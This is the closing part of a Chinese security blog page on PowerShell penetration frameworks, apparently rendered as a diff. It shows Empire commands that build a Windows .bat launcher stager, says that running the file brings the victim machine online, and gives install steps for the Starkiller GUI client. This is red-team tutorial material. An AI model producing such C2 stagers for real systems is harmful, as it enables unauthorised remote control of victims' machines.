+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">execute</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004205077.png" srcset="/img/loading.gif" lazyload alt="image-20240205004205077"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004237370.png" srcset="/img/loading.gif" lazyload alt="image-20240205004237370"></p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">usestager windows/launcher_bat<br>set Listener test(listenner)<span class="hljs-built_in"></span><br><span class="hljs-built_in">execute </span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004824420.png" srcset="/img/loading.gif" lazyload alt="image-20240205004824420"></p>
+<p>将获得的bat文件弄出来，运行之后就上线了</p>
+<h2 id="Empire图形界面工具Starkiller"><a href="#Empire图形界面工具Starkiller" class="headerlink" title="Empire图形界面工具Starkiller"></a>Empire图形界面工具Starkiller</h2><p>这个只是一个客户端，服务端建议还是使用kali 或者docker 下载</p>
+<p>安装</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata">apt <span class="hljs-keyword">update</span><br>apt install nodejs npm -y<br>npm install --<span class="hljs-keyword">global</span> yarn<br>git clone https:<span class="hljs-comment">//github.com/BC-SECURITY/Starkiller.git</span><br><span class="hljs-keyword">cd</span> Starkiller<br>yarn<br>yarn <span class="hljs-keyword">run</span> serve --host<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Powershell渗透框架</div>
+      <div>https://tsy244.github.io/2024/02/04/渗透/Powershell渗透框架/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 4, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/02/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun03/" title="RedSun03">
+                        <span class="hidden-mobile">RedSun03</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
